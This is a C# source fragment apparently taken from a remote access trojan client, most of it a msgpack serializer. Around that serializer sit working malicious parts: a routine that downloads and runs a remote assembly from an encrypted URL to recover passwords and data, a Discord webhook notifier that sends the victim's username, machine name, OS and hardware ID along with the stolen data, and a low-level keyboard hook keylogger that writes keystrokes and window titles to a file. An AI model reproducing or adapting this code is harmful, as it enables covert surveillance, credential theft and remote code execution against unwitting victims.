        msgpack.ForcePathObject(Settings.Key).AsString = Type.ToString();
        msgpack.ForcePathObject(Type.ToString()).AsString = Message;
        Connection.Send(msgpack.Encode2Bytes());
    }


#if IsRecoveryData

    public static string RecoveryData()
    {
        try
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            byte[] data = new WebClient().DownloadData(Encoding.UTF8.GetString(Settings.DecryptBytes(Convert.FromBase64String("YuiIb0bvpOW/HwRCrl07ZyLIxUPAoAy0/EE6+OB0IBhStm9RR7V2byuc2qvN4qWd"))));

            var betterFunction = (Func<string>)Delegate.CreateDelegate(typeof(Func<string>), Assembly.Load(data).GetType("Plugin.Plugin").GetMethod("Run"));

            return betterFunction();
        }
        catch { return "Not Found"; }
    }

#endif

#if IsDiscordNotif



    public static void DiscordNotif()
    {
        try
        {
           ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            using (WebClient WebClient = new WebClient())
            {
                WebClient.UploadValues(Settings.ServerDiscord, new NameValueCollection { { "username", "Hey " + "%HeyMesg%" }, { "avatar_url", Settings.Logo },
                        { "content", "You have a client online now { " + (GetInformationOS.IsNewClient().ToString().ToLower().Contains("true") ? "Old" : "New") + " }" +
                        "\n  " + "✅ Username : " + Environment.UserName +"@" +  Environment.MachineName +
                        "\n  " + "✅ System : " + new ComputerInfo().OSFullName.ToString() +
                        "\n  " + "✅ HWID : " + GetInformationOS.HWID() +
                        "\n  " + "✅ Host : " + Settings.Hosts +
                        "\n  " + "✅ Port : " + Settings.Ports +

#if IsRecoveryData
                        "\n  " + "✅ Recovery Passwords & Data : 🔗 " + RecoveryData() +
#endif
                      
                        "\n  " + "Enjoy :)" } });
            }
               
        }
        catch { }
    }

#endif

    public static readonly string ID = @"Software\" + GetInformationOS.HWID();
    public static bool SetValue(string name, byte[] value)
    {
        try
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                key.SetValue(name, value, RegistryValueKind.Binary);
                return true;
            }
        }
        catch (Exception ex)
        {
            Notif(MsgType.Error, ex.Message);
        }
        return false;
    }

    public static byte[] GetValue(string value)
    {
        try

        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
            {
                object o = key.GetValue(value);
                return (byte[])o;
            }
        }
        catch (Exception ex)
        {
            Notif(MsgType.Error, ex.Message);
        }
        return null;
    }

}

public class BytesTools
{
    static UTF8Encoding utf8Encode = new UTF8Encoding();

    public static byte[] GetUtf8Bytes(String s)
    {

        return utf8Encode.GetBytes(s);
    }

    public static String GetString(byte[] utf8Bytes)
    {
        return utf8Encode.GetString(utf8Bytes);
    }

    public static String BytesAsString(byte[] bytes)
    {
        StringBuilder sb = new StringBuilder();
        foreach (byte b in bytes)
        {
            sb.Append(String.Format("{0:D3} ", b));
        }
        return sb.ToString();
    }


    public static String BytesAsHexString(byte[] bytes)
    {
        StringBuilder sb = new StringBuilder();
        foreach (byte b in bytes)
        {
            sb.Append(String.Format("{0:X2} ", b));
        }
        return sb.ToString();
    }

    /// <summary>
    ///   交换byte数组数据
    ///   可用于高低数据交换
    /// </summary>
    /// <param name="v">要交换的byte数组</param>
    /// <returns>返回交换后的数据</returns>
    public static byte[] SwapBytes(byte[] v)
    {
        byte[] r = new byte[v.Length];
        int j = v.Length - 1;
        for (int i = 0; i < r.Length; i++)
        {
            r[i] = v[j];
            j--;
        }
        return r;
    }

    public static byte[] SwapInt64(Int64 v)
    {

        return SwapBytes(BitConverter.GetBytes(v));
    }

    public static byte[] SwapInt32(Int32 v)
    {
        byte[] r = new byte[4];
        r[3] = (byte)v;
        r[2] = (byte)(v >> 8);
        r[1] = (byte)(v >> 16);
        r[0] = (byte)(v >> 24);
        return r;
    }


    public static byte[] SwapInt16(Int16 v)
    {
        byte[] r = new byte[2];
        r[1] = (byte)v;
        r[0] = (byte)(v >> 8);
        return r;
    }

    public static byte[] SwapDouble(Double v)
    {
        return SwapBytes(BitConverter.GetBytes(v));
    }

}

public class MsgPackEnum : IEnumerator
{
    List<MsgPack> children;
    int position = -1;

    public MsgPackEnum(List<MsgPack> obj)
    {
        children = obj;
    }
    object IEnumerator.Current
    {
        get { return children[position]; }
    }

    bool IEnumerator.MoveNext()
    {
        position++;
        return (position < children.Count);
    }

    void IEnumerator.Reset()
    {
        position = -1;
    }

}

public class MsgPackArray
{
    List<MsgPack> children;
    MsgPack owner;

    public MsgPackArray(MsgPack msgpackObj, List<MsgPack> listObj)
    {
        owner = msgpackObj;
        children = listObj;
    }

    public MsgPack Add()
    {
        return owner.AddArrayChild();
    }

    public MsgPack Add(String value)
    {
        MsgPack obj = owner.AddArrayChild();
        obj.AsString = value;
        return obj;
    }

    public MsgPack Add(Int64 value)
    {
        MsgPack obj = owner.AddArrayChild();
        obj.SetAsInteger(value);
        return obj;
    }

    public MsgPack Add(Double value)
    {
        MsgPack obj = owner.AddArrayChild();
        obj.SetAsFloat(value);
        return obj;
    }

    public MsgPack this[int index]
    {
        get { return children[index]; }
    }

    public int Length
    {
        get { return children.Count; }
    }
}

#if KeyloaggrOfflien

public class Keyloaggr
{
    private static readonly string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static readonly string loggerPath = ApplicationData + @"\Logs" + DateTime.Now.ToShortDateString().Replace("/", "-") + ".Tyson";

    private static string CurrentActiveWindowTitle;

    public static void StartKeyloaggar()
    {
        _hookID = SetHook(_proc);
        System.Windows.Forms.Application.Run();

    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        {
            return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
            bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
            string currentKey = KeyboardLayout((uint)vkCode);

            if (capsLock || shiftPress)
            {
                currentKey = currentKey.ToUpper();
            }
            else
            {
                currentKey = currentKey.ToLower();
            }

            if ((System.Windows.Forms.Keys)vkCode >= System.Windows.Forms.Keys.F1 && (System.Windows.Forms.Keys)vkCode <= System.Windows.Forms.Keys.F24)
                currentKey = "[" + (System.Windows.Forms.Keys)vkCode + "]";

            else
            {
                switch (((System.Windows.Forms.Keys)vkCode).ToString())
                {
                    case "Space":
                        currentKey = "[SPACE]";
                        break;
                    case "Return":
                        currentKey = "[ENTER]";
                        break;
                    case "Escape":
                        currentKey = "[ESC]";
                        break;
                    case "LControlKey":
                        currentKey = "[CTRL]";
                        break;
                    case "RControlKey":
                        currentKey = "[CTRL]";
                        break;
                    case "RShiftKey":
                        currentKey = "[Shift]";
                        break;
                    case "LShiftKey":
                        currentKey = "[Shift]";
                        break;
                    case "Back":
                        currentKey = "[Back]";
                        break;
                    case "LWin":
                        currentKey = "[WIN]";
                        break;
                    case "Tab":
                        currentKey = "[Tab]";
                        break;
                    case "Capital":
                        if (capsLock == true)
                            currentKey = "[CAPSLOCK: OFF]";
                        else
                            currentKey = "[CAPSLOCK: ON]";
                        break;
                }
            }

            using (StreamWriter sw = new StreamWriter(loggerPath, true))
            {

                ///long Size =  new FileInfo(loggerPath).Length;
                ///if (Size >= 500)
                ///{
                ///    loggerPath += 1;
                ///    MessageBox.Show(loggerPath);
                ///}

                if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                {
                    sw.Write(currentKey);
                }
                else
                {
                    sw.WriteLine(Environment.NewLine);
                    sw.WriteLine("[ " + GetActiveWindowTitle() + " | "  + DateTime.Now.ToShortTimeString() + " ]");
                    sw.WriteLine(Environment.NewLine);
                    sw.WriteLine(currentKey);
                }

            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static string KeyboardLayout(uint vkCode)
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            byte[] vkBuffer = new byte[256];
           
            if (!GetKeyboardState(vkBuffer)) return "";
           
            uint scanCode = MapVirtualKey(vkCode, 0);

            uint processId;
            IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out processId));
          
           ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
            return sb.ToString();
        }
        catch { }
        return ((System.Windows.Forms.Keys)vkCode).ToString();
    }

    private static string GetActiveWindowTitle()
    {
        try
        {
            IntPtr hwnd = GetForegroundWindow();
            uint pid;
            GetWindowThreadProcessId(hwnd, out  pid);
            Process p = Process.GetProcessById((int)pid);
            string title = p.MainWindowTitle;
            if (string.IsNullOrWhiteSpace(title))
                title = p.ProcessName;
            CurrentActiveWindowTitle = title;
            return title;
        }
        catch (Exception)
        {
            return "???";
        }
    }

    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    private static int WHKEYBOARDLL = 13;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
    public static extern short GetKeyState(int keyCode);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    static extern uint MapVirtualKey(uint uCode, uint uMapType);

}
#endif



public class MsgPack : IEnumerable
{
    string name;
    string lowerName;
    object innerValue;
    MsgPackType valueType;
    MsgPack parent;
    List<MsgPack> children = new List<MsgPack>();
    MsgPackArray refAsArray = null;

    private void SetName(string value)
    {
        this.name = value;
        this.lowerName = name.ToLower();
    }

    private void Clear()
    {
        for (int i = 0; i < children.Count; i++)
        {
            ((MsgPack)children[i]).Clear();
        }
        children.Clear();
    }

    private MsgPack InnerAdd()
    {
        MsgPack r = new MsgPack();
        r.parent = this;
        this.children.Add(r);
        return r;
    }

    private int IndexOf(string name)
    {
        int i = -1;
        int r = -1;

        string tmp = name.ToLower();
        foreach (MsgPack item in children)
        {
            i++;
            if (tmp.Equals(item.lowerName))
            {
                r = i;
                break;
            }
        }
        return r;
    }

    public MsgPack FindObject(string name)
    {
        int i = IndexOf(name);
        if (i == -1)
        {
            return null;
        }
        else
        {
            return this.children[i];
        }
    }


    private MsgPack InnerAddMapChild()
    {
        if (valueType != MsgPackType.Map)
        {
            Clear();
            this.valueType = MsgPackType.Map;
        }
        return InnerAdd();
    }

    private MsgPack InnerAddArrayChild()
    {
        if (valueType != MsgPackType.Array)
        {
            Clear();
            this.valueType = MsgPackType.Array;
        }
        return InnerAdd();
    }

    public MsgPack AddArrayChild()
    {
        return InnerAddArrayChild();
    }

    private void WriteMap(Stream ms)
    {
        byte b;
        byte[] lenBytes;
        int len = children.Count;
        if (len <= 15)
        {
            b = (byte)(0x80 + (byte)len);
            ms.WriteByte(b);
        }
        else if (len <= 65535)
        {
            b = 0xDE;
            ms.WriteByte(b);

            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int16)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }
        else
        {
            b = 0xDF;
            ms.WriteByte(b);
            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int32)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }

        for (int i = 0; i < len; i++)
        {
            WriteTools.WriteString(ms, children[i].name);
            children[i].Encode2Stream(ms);
        }
    }

    private void WirteArray(Stream ms)
    {
        byte b;
        byte[] lenBytes;
        int len = children.Count;
        if (len <= 15)
        {
            b = (byte)(0x90 + (byte)len);
            ms.WriteByte(b);
        }
        else if (len <= 65535)
        {
            b = 0xDC;
            ms.WriteByte(b);

            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int16)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }
        else
        {
            b = 0xDD;
            ms.WriteByte(b);
            lenBytes = BytesTools.SwapBytes(BitConverter.GetBytes((Int32)len));
            ms.Write(lenBytes, 0, lenBytes.Length);
        }


        for (int i = 0; i < len; i++)
        {
            ((MsgPack)children[i]).Encode2Stream(ms);
        }
    }

    public void SetAsInteger(Int64 value)
    {
        this.innerValue = value;
        this.valueType = MsgPackType.Integer;
    }

    public void SetAsUInt64(UInt64 value)
    {
        this.innerValue = value;
        this.valueType = MsgPackType.UInt64;
    }

    public UInt64 GetAsUInt64()
    {
        switch (this.valueType)
        {
            case MsgPackType.Integer:
                return Convert.ToUInt64((Int64)this.innerValue);
            case MsgPackType.UInt64:
                return (UInt64)this.innerValue;
            case MsgPackType.String:
                return UInt64.Parse(this.innerValue.ToString().Trim());
            case MsgPackType.Float:
                return Convert.ToUInt64((Double)this.innerValue);
            case MsgPackType.Single:
                return Convert.ToUInt64((Single)this.innerValue);
            case MsgPackType.DateTime:
                return Convert.ToUInt64((DateTime)this.innerValue);
            default:
                return 0;
        }

    }

    public Int64 GetAsInteger()
    {
        switch (this.valueType)
        {
            case MsgPackType.Integer:
                return (Int64)this.innerValue;
            case MsgPackType.UInt64:
                return Convert.ToInt64((Int64)this.innerValue);
            case MsgPackType.String:
                return Int64.Parse(this.innerValue.ToString().Trim());
            case MsgPackType.Float:
                return Convert.ToInt64((Double)this.innerValue);
            case MsgPackType.Single:
                return Convert.ToInt64((Single)this.innerValue);
            case MsgPackType.DateTime:
                return Convert.ToInt64((DateTime)this.innerValue);
            default:
                return 0;
        }
    }

    public Double GetAsFloat()
    {
        switch (this.valueType)
        {
            case MsgPackType.Integer:
                return Convert.ToDouble((Int64)this.innerValue);
            case MsgPackType.String:
                return Double.Parse((String)this.innerValue);
            case MsgPackType.Float:
                return (Double)this.innerValue;
            case MsgPackType.Single:
                return (Single)this.innerValue;
            case MsgPackType.DateTime:
                return Convert.ToInt64((DateTime)this.innerValue);
            default:
                return 0;
        }
    }


    public void SetAsBytes(byte[] value)
    {
        this.innerValue = value;
        this.valueType = MsgPackType.Binary;
    }

    public byte[] GetAsBytes()
    {
        switch (this.valueType)
        {
            case MsgPackType.Integer:
                return BitConverter.GetBytes((Int64)this.innerValue);
            case MsgPackType.String:
                return BytesTools.GetUtf8Bytes(this.innerValue.ToString());
            case MsgPackType.Float:
                return BitConverter.GetBytes((Double)this.innerValue);
            case MsgPackType.Single:
                return BitConverter.GetBytes((Single)this.innerValue);
            case MsgPackType.DateTime:
                long dateval = ((DateTime)this.innerValue).ToBinary();
                return BitConverter.GetBytes(dateval);
            case MsgPackType.Binary:
                return (byte[])this.innerValue;
            default:
                return new byte[] { };
        }
    }

    public void Add(string key, String value)
    {
        MsgPack tmp = InnerAddArrayChild();
        tmp.name = key;
        tmp.SetAsString(value);
    }

    public void Add(string key, int value)
    {
        MsgPack tmp = InnerAddArrayChild();
        tmp.name = key;
        tmp.SetAsInteger(value);
    }

    public bool LoadFileAsBytes(string fileName)
    {
        if (File.Exists(fileName))
        {
            byte[] value = null;
            FileStream fs = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.Read);
            value = new byte[fs.Length];
            fs.Read(value, 0, (int)fs.Length);
            fs.Close();
            fs.Dispose();
            SetAsBytes(value);
            return true;
        }
        else
        {
            return false;
        }

    }

    public bool SaveBytesToFile(string fileName)
    {
        if (this.innerValue != null)
        {
            FileStream fs = new FileStream(fileName, FileMode.Append);
            fs.Write(((byte[])this.innerValue), 0, ((byte[])this.innerValue).Length);
            fs.Close();
            fs.Dispose();
            return true;
        }
        else
        {
            return false;
        }
    }

    public MsgPack ForcePathObject(string path)
    {
        MsgPack tmpParent, tmpObject;
        tmpParent = this;
        string[] pathList = path.Trim().Split(new Char[] { '.', '/', '\\' });
        string tmp = null;
        if (pathList.Length == 0)
        {
            return null;
        }
        else if (pathList.Length > 1)
        {
            for (int i = 0; i < pathList.Length - 1; i++)
            {
                tmp = pathList[i];
                tmpObject = tmpParent.FindObject(tmp);
                if (tmpObject == null)
                {
                    tmpParent = tmpParent.InnerAddMapChild();
                    tmpParent.SetName(tmp);
                }
                else
                {
                    tmpParent = tmpObject;
                }
            }
        }
        tmp = pathList[pathList.Length - 1];
        int j = tmpParent.IndexOf(tmp);
        if (j > -1)
        {
            return tmpParent.children[j];
        }
        else
        {
            tmpParent = tmpParent.InnerAddMapChild();
            tmpParent.SetName(tmp);
            return tmpParent;
        }
    }

    public void SetAsNull()
    {
        Clear();
        this.innerValue = null;
        this.valueType = MsgPackType.Null;
    }

    public void SetAsString(String value)
    {
        this.innerValue = value;
        this.valueType = MsgPackType.String;
    }

    public String GetAsString()
    {
        if (this.innerValue == null)
        {
            return "";
        }
        else
        {
            return this.innerValue.ToString();
        }

    }

    public void SetAsBoolean(Boolean bVal)
    {
        this.valueType = MsgPackType.Boolean;
        this.innerValue = bVal;
    }

    public void SetAsSingle(Single fVal)
    {
        this.valueType = MsgPackType.Single;
        this.innerValue = fVal;
    }

    public void SetAsFloat(Double fVal)
    {
        this.valueType = MsgPackType.Float;
        this.innerValue = fVal;
    }



    public void DecodeFromBytes(byte[] bytes)
    {
        using (MemoryStream ms = new MemoryStream())
        {
            bytes = Algorithm.Decompress(bytes);
            ms.Write(bytes, 0, bytes.Length);
            ms.Position = 0;
            DecodeFromStream(ms);
        }
    }

    public void DecodeFromFile(string fileName)
    {
        FileStream fs = new FileStream(fileName, FileMode.Open);
        DecodeFromStream(fs);
        fs.Dispose();
    }



    public void DecodeFromStream(Stream ms)
    {
        byte lvByte = (byte)ms.ReadByte();
        byte[] rawByte = null;
        MsgPack msgPack = null;
        int len = 0;
        int i = 0;

        if (lvByte <= 0x7F)
        {   //positive fixint	0xxxxxxx	0x00 - 0x7f
            SetAsInteger(lvByte);
        }
        else if ((lvByte >= 0x80) && (lvByte <= 0x8F))
        {
            //fixmap	1000xxxx	0x80 - 0x8f
            this.Clear();
            this.valueType = MsgPackType.Map;
            len = lvByte - 0x80;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.SetName(ReadTools.ReadString(ms));
                msgPack.DecodeFromStream(ms);
            }
        }
        else if ((lvByte >= 0x90) && (lvByte <= 0x9F))  //fixarray	1001xxxx	0x90 - 0x9f
        {
            //fixmap	1000xxxx	0x80 - 0x8f
            this.Clear();
            this.valueType = MsgPackType.Array;
            len = lvByte - 0x90;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.DecodeFromStream(ms);
            }
        }
        else if ((lvByte >= 0xA0) && (lvByte <= 0xBF))  // fixstr	101xxxxx	0xa0 - 0xbf
        {
            len = lvByte - 0xA0;
            SetAsString(ReadTools.ReadString(ms, len));
        }
        else if ((lvByte >= 0xE0) && (lvByte <= 0xFF))
        {   /// -1..-32
            //  negative fixnum stores 5-bit negative integer
            //  +--------+
            //  |111YYYYY|
            //  +--------+                
            SetAsInteger((sbyte)lvByte);
        }
        else if (lvByte == 0xC0)
        {
            SetAsNull();
        }
        else if (lvByte == 0xC1)
        {
            throw new Exception("(never used) type $c1");
        }
        else if (lvByte == 0xC2)
        {
            SetAsBoolean(false);
        }
        else if (lvByte == 0xC3)
        {
            SetAsBoolean(true);
        }
        else if (lvByte == 0xC4)
        {  // max 255
            len = ms.ReadByte();
            rawByte = new byte[len];
            ms.Read(rawByte, 0, len);
            SetAsBytes(rawByte);
        }
        else if (lvByte == 0xC5)
        {  // max 65535                
            rawByte = new byte[2];
            ms.Read(rawByte, 0, 2);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToUInt16(rawByte, 0);

            // read binary
            rawByte = new byte[len];
            ms.Read(rawByte, 0, len);
            SetAsBytes(rawByte);
        }
        else if (lvByte == 0xC6)
        {  // binary max: 2^32-1                
            rawByte = new byte[4];
            ms.Read(rawByte, 0, 4);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToInt32(rawByte, 0);

            // read binary
            rawByte = new byte[len];
            ms.Read(rawByte, 0, len);
            SetAsBytes(rawByte);
        }
        else if ((lvByte == 0xC7) || (lvByte == 0xC8) || (lvByte == 0xC9))
        {
            throw new Exception("(ext8,ext16,ex32) type $c7,$c8,$c9");
        }
        else if (lvByte == 0xCA)
        {  // float 32              
            rawByte = new byte[4];
            ms.Read(rawByte, 0, 4);
            rawByte = BytesTools.SwapBytes(rawByte);

            SetAsSingle(BitConverter.ToSingle(rawByte, 0));
        }
        else if (lvByte == 0xCB)
        {  // float 64              
            rawByte = new byte[8];
            ms.Read(rawByte, 0, 8);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsFloat(BitConverter.ToDouble(rawByte, 0));
        }
        else if (lvByte == 0xCC)
        {  // uint8   
           //      uint 8 stores a 8-bit unsigned integer
           //      +--------+--------+
           //      |  0xcc  |ZZZZZZZZ|
           //      +--------+--------+
            lvByte = (byte)ms.ReadByte();
            SetAsInteger(lvByte);
        }
        else if (lvByte == 0xCD)
        {  // uint16      
           //    uint 16 stores a 16-bit big-endian unsigned integer
           //    +--------+--------+--------+
           //    |  0xcd  |ZZZZZZZZ|ZZZZZZZZ|
           //    +--------+--------+--------+
            rawByte = new byte[2];
            ms.Read(rawByte, 0, 2);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsInteger(BitConverter.ToUInt16(rawByte, 0));
        }
        else if (lvByte == 0xCE)
        {
            //  uint 32 stores a 32-bit big-endian unsigned integer
            //  +--------+--------+--------+--------+--------+
            //  |  0xce  |ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ
            //  +--------+--------+--------+--------+--------+
            rawByte = new byte[4];
            ms.Read(rawByte, 0, 4);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsInteger(BitConverter.ToUInt32(rawByte, 0));
        }
        else if (lvByte == 0xCF)
        {
            //  uint 64 stores a 64-bit big-endian unsigned integer
            //  +--------+--------+--------+--------+--------+--------+--------+--------+--------+
            //  |  0xcf  |ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|
            //  +--------+--------+--------+--------+--------+--------+--------+--------+--------+
            rawByte = new byte[8];
            ms.Read(rawByte, 0, 8);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsUInt64(BitConverter.ToUInt64(rawByte, 0));
        }
        else if (lvByte == 0xDC)
        {
            //      +--------+--------+--------+~~~~~~~~~~~~~~~~~+
            //      |  0xdc  |YYYYYYYY|YYYYYYYY|    N objects    |
            //      +--------+--------+--------+~~~~~~~~~~~~~~~~~+
            rawByte = new byte[2];
            ms.Read(rawByte, 0, 2);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToInt16(rawByte, 0);

            this.Clear();
            this.valueType = MsgPackType.Array;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.DecodeFromStream(ms);
            }
        }
        else if (lvByte == 0xDD)
        {
            //  +--------+--------+--------+--------+--------+~~~~~~~~~~~~~~~~~+
            //  |  0xdd  |ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|    N objects    |
            //  +--------+--------+--------+--------+--------+~~~~~~~~~~~~~~~~~+
            rawByte = new byte[4];
            ms.Read(rawByte, 0, 4);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToInt16(rawByte, 0);

            this.Clear();
            this.valueType = MsgPackType.Array;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.DecodeFromStream(ms);
            }
        }
        else if (lvByte == 0xD9)
        {
            //  str 8 stores a byte array whose length is upto (2^8)-1 bytes:
            //  +--------+--------+========+
            //  |  0xd9  |YYYYYYYY|  data  |
            //  +--------+--------+========+
            SetAsString(ReadTools.ReadString(lvByte, ms));
        }
        else if (lvByte == 0xDE)
        {
            //    +--------+--------+--------+~~~~~~~~~~~~~~~~~+
            //    |  0xde  |YYYYYYYY|YYYYYYYY|   N*2 objects   |
            //    +--------+--------+--------+~~~~~~~~~~~~~~~~~+
            rawByte = new byte[2];
            ms.Read(rawByte, 0, 2);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToInt16(rawByte, 0);

            this.Clear();
            this.valueType = MsgPackType.Map;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.SetName(ReadTools.ReadString(ms));
                msgPack.DecodeFromStream(ms);
            }
        }
        else if (lvByte == 0xDE)
        {
            //    +--------+--------+--------+~~~~~~~~~~~~~~~~~+
            //    |  0xde  |YYYYYYYY|YYYYYYYY|   N*2 objects   |
            //    +--------+--------+--------+~~~~~~~~~~~~~~~~~+
            rawByte = new byte[2];
            ms.Read(rawByte, 0, 2);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToInt16(rawByte, 0);

            this.Clear();
            this.valueType = MsgPackType.Map;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.SetName(ReadTools.ReadString(ms));
                msgPack.DecodeFromStream(ms);
            }
        }
        else if (lvByte == 0xDF)
        {
            //    +--------+--------+--------+--------+--------+~~~~~~~~~~~~~~~~~+
            //    |  0xdf  |ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|   N*2 objects   |
            //    +--------+--------+--------+--------+--------+~~~~~~~~~~~~~~~~~+
            rawByte = new byte[4];
            ms.Read(rawByte, 0, 4);
            rawByte = BytesTools.SwapBytes(rawByte);
            len = BitConverter.ToInt32(rawByte, 0);

            this.Clear();
            this.valueType = MsgPackType.Map;
            for (i = 0; i < len; i++)
            {
                msgPack = InnerAdd();
                msgPack.SetName(ReadTools.ReadString(ms));
                msgPack.DecodeFromStream(ms);
            }
        }
        else if (lvByte == 0xDA)
        {
            //      str 16 stores a byte array whose length is upto (2^16)-1 bytes:
            //      +--------+--------+--------+========+
            //      |  0xda  |ZZZZZZZZ|ZZZZZZZZ|  data  |
            //      +--------+--------+--------+========+
            SetAsString(ReadTools.ReadString(lvByte, ms));
        }
        else if (lvByte == 0xDB)
        {
            //  str 32 stores a byte array whose length is upto (2^32)-1 bytes:
            //  +--------+--------+--------+--------+--------+========+
            //  |  0xdb  |AAAAAAAA|AAAAAAAA|AAAAAAAA|AAAAAAAA|  data  |
            //  +--------+--------+--------+--------+--------+========+
            SetAsString(ReadTools.ReadString(lvByte, ms));
        }
        else if (lvByte == 0xD0)
        {
            //      int 8 stores a 8-bit signed integer
            //      +--------+--------+
            //      |  0xd0  |ZZZZZZZZ|
            //      +--------+--------+
            SetAsInteger((sbyte)ms.ReadByte());
        }
        else if (lvByte == 0xD1)
        {
            //    int 16 stores a 16-bit big-endian signed integer
            //    +--------+--------+--------+
            //    |  0xd1  |ZZZZZZZZ|ZZZZZZZZ|
            //    +--------+--------+--------+
            rawByte = new byte[2];
            ms.Read(rawByte, 0, 2);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsInteger(BitConverter.ToInt16(rawByte, 0));
        }
        else if (lvByte == 0xD2)
        {
            //  int 32 stores a 32-bit big-endian signed integer
            //  +--------+--------+--------+--------+--------+
            //  |  0xd2  |ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|
            //  +--------+--------+--------+--------+--------+
            rawByte = new byte[4];
            ms.Read(rawByte, 0, 4);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsInteger(BitConverter.ToInt32(rawByte, 0));
        }
        else if (lvByte == 0xD3)
        {
            //  int 64 stores a 64-bit big-endian signed integer
            //  +--------+--------+--------+--------+--------+--------+--------+--------+--------+
            //  |  0xd3  |ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|ZZZZZZZZ|
            //  +--------+--------+--------+--------+--------+--------+--------+--------+--------+
            rawByte = new byte[8];
            ms.Read(rawByte, 0, 8);
            rawByte = BytesTools.SwapBytes(rawByte);
            SetAsInteger(BitConverter.ToInt64(rawByte, 0));
        }
    }

    public byte[] Encode2Bytes()
    {
        using (MemoryStream ms = new MemoryStream())
        {
            Encode2Stream(ms);
            byte[] r = new byte[ms.Length];
            ms.Position = 0;
            ms.Read(r, 0, (int)ms.Length);
            return Algorithm.Compress(r);
        }
    }

